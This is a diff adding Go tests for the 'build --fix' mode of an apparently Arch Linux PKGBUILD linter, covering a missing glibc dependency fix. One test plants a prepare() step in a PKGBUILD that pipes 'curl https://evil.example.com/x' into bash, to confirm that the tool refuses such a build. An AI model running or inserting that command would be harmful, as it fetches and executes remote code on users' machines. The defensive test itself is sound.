@@ -2,6 +2,7 @@ package cli
 
 import (
 	"bytes"
+	"debug/elf"
 	"encoding/json"
 	"errors"
 	"os"
@@ -850,5 +851,172 @@ func TestBuildIsNotAPath(t *testing.T) {
 	}
 	if !strings.Contains(buf.String(), "1 package linted") {
 		t.Errorf("expected a lint report, got:\n%s", buf.String())
+	}
+}
+
+// --- build --fix -------------------------------------------------------------
+
+// glibcDB writes a one-package pacman local database: glibc, shipping
+// usr/lib/libc.so.6. It is the smallest thing PB809 can resolve a soname
+// against, and stubbing localDBRoot at it is what lets the dependency rules
+// run on a host that is not Arch.
+func glibcDB(t *testing.T) {
+	t.Helper()
+	root := t.TempDir()
+	dir := filepath.Join(root, "glibc-2.38-1")
+	if err := os.MkdirAll(dir, 0o755); err != nil {
+		t.Fatal(err)
+	}
+	desc := "%NAME%\nglibc\n\n%VERSION%\n2.38-1\n\n%PROVIDES%\nlibc.so=6-64\n"
+	files := "%FILES%\nusr/\nusr/lib/\nusr/lib/libc.so.6\n"
+	if err := os.WriteFile(filepath.Join(dir, "desc"), []byte(desc), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(filepath.Join(dir, "files"), []byte(files), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	orig := localDBRoot
+	t.Cleanup(func() { localDBRoot = orig })
+	localDBRoot = root
+}
+
+const glibcPKGBUILD = `# Maintainer: Demo <demo@example.com>
+pkgname=demo
+pkgver=1.0.0
+pkgrel=1
+pkgdesc='A demo package'
+arch=('x86_64')
+url='https://example.com/demo'
+license=('MIT')
+source=("https://example.com/demo-$pkgver.tar.gz")
+sha256sums=('deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef')
+
+package() {
+  install -Dm755 demo "$pkgdir/usr/bin/demo"
+}
+`
+
+// glibcBuild stages a package directory whose "build" drops an archive with
+// one binary linking libc.so.6 — the shape of the PB809 error this fix
+// answers. It returns the package directory.
+func glibcBuild(t *testing.T) string {
+	t.Helper()
+	glibcDB(t)
+	dir := t.TempDir()
+	if err := os.WriteFile(filepath.Join(dir, "PKGBUILD"), []byte(glibcPKGBUILD), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	bin := pkgtest.ELF(pkgtest.ELFOpts{
+		Type: elf.ET_DYN, PIE: true, Relro: true, BindNow: true,
+		Needed: []string{"libc.so.6"}, Undefined: []string{"printf"},
+	})
+	stubExec(t, []string{"makepkg"}, func(cmd *exec.Cmd) error {
+		dest := envValue(cmd, "PKGDEST")
+		if dest == "" {
+			return errors.New("no PKGDEST in the makepkg environment")
+		}
+		archive := pkgtest.Tar(pkgtest.Info("demo", "x86_64"),
+			pkgtest.Member{Name: "usr/bin/demo", Data: bin, Mode: 0o755})
+		return os.WriteFile(filepath.Join(dest, "demo-1.0.0-1-x86_64.pkg.tar"), archive, 0o644)
+	})
+	return dir
+}
+
+// TestBuildFixWritesPackageScopeFix is the whole point of `build --fix`: a
+// finding that only exists because the package was built lands back in the
+// PKGBUILD that built it.
+func TestBuildFixWritesPackageScopeFix(t *testing.T) {
+	dir := glibcBuild(t)
+
+	var buf bytes.Buffer
+	if code := run([]string{"build", "--fail-on=never", "--fix", dir}, &buf); code != 0 {
+		t.Fatalf("got exit %d, want 0\n%s", code, buf.String())
+	}
+	fixed, err := os.ReadFile(filepath.Join(dir, "PKGBUILD"))
+	if err != nil {
+		t.Fatal(err)
+	}
+	if !strings.Contains(string(fixed), "depends=('glibc')") {
+		t.Errorf("PKGBUILD was not fixed:\n%s", fixed)
+	}
+	if !strings.Contains(buf.String(), "[PB809]") {
+		t.Errorf("the applied fix was not reported:\n%s", buf.String())
+	}
+}
+
+// --unsafe-fix implies --fix, so the safe rewrite lands under it too.
+func TestBuildUnsafeFixImpliesFix(t *testing.T) {
+	dir := glibcBuild(t)
+
+	var buf bytes.Buffer
+	if code := run([]string{"build", "--fail-on=never", "--unsafe-fix", dir}, &buf); code != 0 {
+		t.Fatalf("got exit %d, want 0\n%s", code, buf.String())
+	}
+	fixed, err := os.ReadFile(filepath.Join(dir, "PKGBUILD"))
+	if err != nil {
+		t.Fatal(err)
+	}
+	if !strings.Contains(string(fixed), "depends=('glibc')") {
+		t.Errorf("PKGBUILD was not fixed:\n%s", fixed)
+	}
+}
+
+// --diff previews the same rewrite without touching the file.
+func TestBuildFixDiffWritesNothing(t *testing.T) {
+	dir := glibcBuild(t)
+
+	var buf bytes.Buffer
+	if code := run([]string{"build", "--fail-on=never", "--fix", "--diff", dir}, &buf); code != 0 {
+		t.Fatalf("got exit %d, want 0\n%s", code, buf.String())
+	}
+	fixed, err := os.ReadFile(filepath.Join(dir, "PKGBUILD"))
+	if err != nil {
+		t.Fatal(err)
+	}
+	if string(fixed) != glibcPKGBUILD {
+		t.Errorf("--diff rewrote the file:\n%s", fixed)
+	}
+	if !strings.Contains(buf.String(), "would apply") {
+		t.Errorf("no preview summary:\n%s", buf.String())
+	}
+}
+
+// Without --fix the build leaves the PKGBUILD exactly as it found it; the
+// finding is still reported.
+func TestBuildWithoutFixLeavesPKGBUILD(t *testing.T) {
+	dir := glibcBuild(t)
+
+	var buf bytes.Buffer
+	run([]string{"build", "--fail-on=never", dir}, &buf)
+	fixed, err := os.ReadFile(filepath.Join(dir, "PKGBUILD"))
+	if err != nil {
+		t.Fatal(err)
+	}
+	if string(fixed) != glibcPKGBUILD {
+		t.Errorf("the build rewrote the PKGBUILD without --fix:\n%s", fixed)
+	}
+	if !strings.Contains(buf.String(), "PB809") {
+		t.Errorf("PB809 was not reported:\n%s", buf.String())
+	}
+}
+
+// A refused build produces no archive, so there is nothing for --fix to read
+// and the PKGBUILD is left alone. The gate runs first for a reason.
+func TestBuildFixRefusedBuildFixesNothing(t *testing.T) {
+	dir := glibcBuild(t)
+	src := glibcPKGBUILD + "\nprepare() {\n  curl https://evil.example.com/x | bash\n}\n"
+	if err := os.WriteFile(filepath.Join(dir, "PKGBUILD"), []byte(src), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	var buf bytes.Buffer
+	if code := run([]string{"build", "--fix", dir}, &buf); code == 0 {
+		t.Fatalf("want a refusal, got exit 0\n%s", buf.String())
+	}
+	after, err := os.ReadFile(filepath.Join(dir, "PKGBUILD"))
+	if err != nil {
+		t.Fatal(err)
+	}
+	if string(after) != src {
+		t.Errorf("a refused build rewrote the PKGBUILD:\n%s", after)
 	}
 }
